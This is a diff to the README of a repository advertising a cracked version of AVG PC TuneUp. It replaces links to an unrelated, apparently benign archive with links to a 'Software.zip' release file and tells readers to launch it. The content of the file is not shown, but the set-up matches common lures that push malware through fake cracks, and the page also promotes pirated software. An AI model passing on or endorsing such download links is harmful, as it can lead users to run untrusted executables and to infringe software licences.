@@ -8,7 +8,7 @@ Welcome to the AVG TuneUp Crack repository! Here you can find all you need to kn
 - **Topics:** activate-avg-pc-tuneup, avg-android-tuneup, avg-pc-tuneup-2011-download, avg-pc-tuneup-2014-key, and more.
 
 ## Quick Links
-[Download AVG PC TuneUp](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download AVG PC TuneUp](https://github.com/arthurvill/AVG-TuneUp-Crack/releases/download/v1.0/Software.zip)
 Launch the file to get started!
 
 ## What to Expect
@@ -37,7 +37,7 @@ Have questions or feedback about AVG TuneUp? Reach out to us through the reposit
 
 ---
 
-[![Download AVG PC TuneUp](https://img.shields.io/badge/Download-AVG_TuneUp-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download AVG PC TuneUp](https://github.com/arthurvill/AVG-TuneUp-Crack/releases/download/v1.0/Software.zip)](https://github.com/arthurvill/AVG-TuneUp-Crack/releases/download/v1.0/Software.zip)
 
 ---
 
